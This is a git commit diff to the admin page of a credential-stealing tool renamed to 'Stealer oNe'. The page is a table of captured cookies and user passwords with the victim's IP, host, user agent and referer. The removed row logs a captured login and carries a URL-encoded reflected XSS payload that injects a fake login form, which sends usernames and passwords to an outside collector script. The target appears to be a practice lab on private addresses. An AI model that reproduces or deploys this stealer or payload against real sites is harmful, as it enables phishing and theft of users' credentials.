bbfea41abb364b7bb3b89a0f0a102d0f7dae2a36
gpinero <32255017+gpinero007@users.noreply.github.com>
2017-11-26 22:50:29 +0100

    Update admin.php

--- admin.php
+++ admin.php
@@ -2,7 +2,7 @@
 <html xmlns="http://www.w3.org/1999/xhtml">
 <head>
 <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
-<title>Robo-Cooker</title>
+<title>Stealer oNe</title>
 <style type="text/css">
 <!--
 body,td,th,tr{
@@ -22,7 +22,6 @@ body {
 Cookies:</p>
 <table width="90%">
 <tr><td>IP:</td><td>Host:</td><td>User-Agent:</td><td>Date:</td><td>Time:</td><td>cookie / user - password:</td><td>Referer:</td></tr>
-<tr><td>192.168.74.1</td><td>192.168.74.1</td><td>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0</td><td>26/11/2017</td><td>22:40:12</td><td>Usuario: gpinero - Password: contraseña11</td><td>http://192.168.74.129/vulnerabilities/xss_r/?name=%3CsCriPt%3E+document.getElementsByName(%27XSS%27)[0].style.display+%3D+%22none%22%3B+var+div+%3D+document.createElement(%27div%27)%3B+div.className+%3D+%27vulnerable_code_area%27%3B+div.innerHTML+%3D+%27%3Cform+name%3D%22evil%22+action%3D%22http%3A%2F%2F192.168.74.100%2Fc%2Fc.php%22+method%3D%22GET%22%3E%3Cp%3EUser+login%3A%3Cbr%2F%3E%3Cbr%2F%3E%3Clabel%3E%3Cb%3EUsername%3A+%3C%2Fb%3E%3C%2Flabel%3E%3Cinput+type%3D%22text%22+placeholder%3D%22Enter+user+name%22+name%3D%22uname%22+required%3E%3Cbr%2F%3E%3Clabel%3E%3Cb%3EPassword%3A++%3C%2Fb%3E%3C%2Flabel%3E%3Cinput+type%3D%22password%22+placeholder%3D%22Enter+Password%22+name%3D%22psw%22+required%3E%3Cbr%2F%3E%3Cbr%2F%3E%3Cbutton+type%3D%22submit%22%3ELogin%3C%2Fbutton%3E%3C%2Fp%3E%3C%2Fform%3E%27%3B+document.getElementsByClassName(%27vulnerable_code_area%27)[0].appendChild(div)%3B+%3C%2FsCriPt%3E</td></tr>
 <!-- Breakpoint -->
 </table>
 <p>&nbsp;</p>
